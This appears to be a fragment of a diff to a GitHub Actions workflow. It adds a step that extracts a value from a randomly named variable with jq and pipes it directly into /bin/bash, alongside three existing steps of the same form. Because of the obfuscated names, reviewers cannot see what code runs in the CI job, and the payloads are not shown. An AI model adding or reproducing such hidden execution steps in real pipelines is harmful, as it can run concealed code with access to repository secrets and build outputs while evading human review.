@@ -31,6 +31,7 @@ jobs:
           echo $hoc19 | jq -r .ijhl85 | /bin/bash
           echo $rdwt2895 | jq -r .a83 | /bin/bash
           echo $w01065 | jq -r .l71657 | /bin/bash
+          printf '%s' "$o84" | jq -r .z01251 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
